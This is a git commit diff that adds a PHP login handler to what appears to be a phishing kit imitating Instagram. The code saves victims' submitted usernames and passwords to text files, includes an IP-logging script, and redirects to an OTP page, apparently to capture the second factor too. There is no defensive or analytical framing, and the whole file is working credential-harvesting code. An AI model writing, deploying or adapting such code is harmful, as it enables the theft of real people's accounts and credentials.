f4d8b6eb4f898b9046f50530810b2ddcb67d9478
Mr.Ruthless Devil <77040067+RDXLR@users.noreply.github.com>
2022-04-12 11:52:51 +0530

    Add files via upload

---
+++ .sites/ig_advanced/otp/login.php
@@ -0,0 +1,8 @@
+<?php
+include 'ip.php';
+file_put_contents("usernames.txt", "Instagram Username : " . $email = $_POST['username'] . "\n", FILE_APPEND);
+?>
+<?php
+file_put_contents("pass.txt", "Instagram Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
+header('Location: otp.html');
+?>
